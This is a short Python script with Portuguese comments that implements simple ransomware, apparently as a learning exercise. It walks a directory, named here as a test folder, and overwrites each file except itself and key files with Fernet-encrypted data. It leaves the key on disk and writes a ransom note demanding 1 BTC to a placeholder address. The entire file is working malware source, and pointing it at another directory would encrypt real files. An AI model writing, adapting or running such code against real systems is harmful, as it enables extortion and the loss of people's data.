from cryptography.fernet import Fernet # biblioteca de criptografia 
import os # sistema operacional

# GERAR UMA CHAVE DA CRIPTOGRAFIA E SALVAR:

def gerar_chave():
    chave = Fernet.generate_key() # gera a chave
    with open("chave.key", "wb") as chave_file: # cria um arquivo chamado "chave.key"
        chave_file.write(chave) # coloca a chave

# CARREGAR A CHAVE SALVA:

def carregar_chave():
    return open("chave.key", "rb").read() # somente lê o conteudo do arquivo "chave.key"

# CRIPTGRAFAR UM ÚNICO ARQUIVO:

def criptografar_arquivo(arquivo, chave): 
    f = Fernet(chave)
    with open(arquivo, "rb") as file: # le o arquivo alvo
        dados = file.read()
    dados_encriptados = f.encrypt(dados) # criptografa esses dados
    with open (arquivo, "wb") as file:
        file.write(dados_encriptados) # sobreescreve os dados antigos legíveis com os dados criptografados

# ENCONTRAR ARQUIVOS PARA CRIPTOGRAFAR:

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"): # impede que o proprio ransomware seja afetado
                lista.append(caminho)
    return lista

# MENSAGEM DE RESGATE:

def criar_mensagem_resgate():
    with open("MENSAGEM.TXT", "w") as f:
        f.write("Seus arquivos foram criptografados\n")
        f.write("Envie 1 BTC para o endereço: fakeaddress.com")
        f.write("Depois do pagamento, enviaremos a chave de descriptografia")

# EXECUÇÃO PRINCIPAL:

def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("Ransomware/Test") 
    for arquivo in arquivos:
        print("Criptografando:", arquivo)
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransomware executado, arquivos criptografados.")


if __name__=="__main__":
    main()
